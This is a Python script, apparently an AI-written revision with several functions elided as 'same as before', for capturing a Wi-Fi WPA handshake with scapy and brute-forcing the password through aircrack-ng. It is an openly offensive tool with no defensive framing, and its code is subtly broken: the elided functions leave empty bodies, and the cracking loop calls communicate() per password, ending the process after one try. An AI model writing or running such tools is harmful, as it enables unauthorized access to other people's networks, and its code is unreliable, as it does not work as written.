  import subprocess
import os
import time
from scapy.all import *
import itertools
import string

def capture_handshake(interface, bssid, filename="handshake.pcap"):
    # ... (same capture_handshake function as before)

def decode_handshake(pcap_file):
    # ... (same decode_handshake function as before)

def generate_passwords(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation  # All possible characters

    for combination in itertools.product(string.ascii_letters, *(characters for _ in range(length - 1))): # Start with letters
        yield "".join(combination)

def crack_handshake(pcap_file, wordlist_generator):
    try:
        # Use a subprocess to run aircrack-ng (more efficient)
        aircrack_command = [
            "aircrack-ng",
            "-w", "-",  # Read passwords from stdin
            pcap_file
        ]

        aircrack_process = subprocess.Popen(aircrack_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for password in wordlist_generator:
            aircrack_process.stdin.write(f"{password}\n".encode())  # Send password to aircrack-ng
            aircrack_process.stdin.flush()  # Important: Flush the buffer

            # Check for success (you might need to adjust this based on aircrack-ng's output)
            stdout, stderr = aircrack_process.communicate(timeout=2) # Set a timeout to prevent hanging
            if "KEY FOUND!" in stdout.decode():
                print(f"Password found: {password}")
                return password

        print("Password not found in the generated wordlist.")
        return None

    except FileNotFoundError:
        print("Error: aircrack-ng not found. Make sure it's installed.")
        return None
    except subprocess.TimeoutExpired:
        print("Aircrack-ng timed out. The password might be very difficult to crack or not in the list.")
        return None
    except Exception as e:
        print(f"An error occurred during cracking: {e}")
        return None


if __name__ == "__main__":
   # ... (same interface and BSSID input as before)

    pcap_filename = "handshake.pcap"
    captured_file = capture_handshake(interface, bssid, pcap_filename)

    if captured_file:
        # ... (same decoding as before)

        # Cracking
        password = crack_handshake(captured_file, generate_passwords())

        if password:
            print(f"Wi-Fi password cracked: {password}")
        else:
            print("Password cracking failed.")

    else:
        print("Handshake capture failed.")
    